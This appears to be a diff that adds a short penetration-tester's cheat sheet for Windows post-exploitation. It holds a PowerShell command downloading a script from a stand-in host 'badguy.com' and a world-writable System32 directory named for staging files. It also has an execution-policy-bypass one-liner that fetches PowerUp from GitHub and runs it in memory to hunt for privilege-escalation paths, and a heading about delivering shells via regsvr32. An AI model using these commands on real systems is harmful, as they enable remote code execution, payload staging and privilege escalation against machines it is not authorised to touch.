@@ -1,0 +1,10 @@
+# Older services; delivery of shells when you have command execution using rgsvr32
+
+# Download scripts
+invoke-webrequest http://badguy.com -outfile somefile.ps1
+
+# world-writeable directory
+C:\windows\System32\spool\drivers\color
+
+# Download powerup and execute; in-mem
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
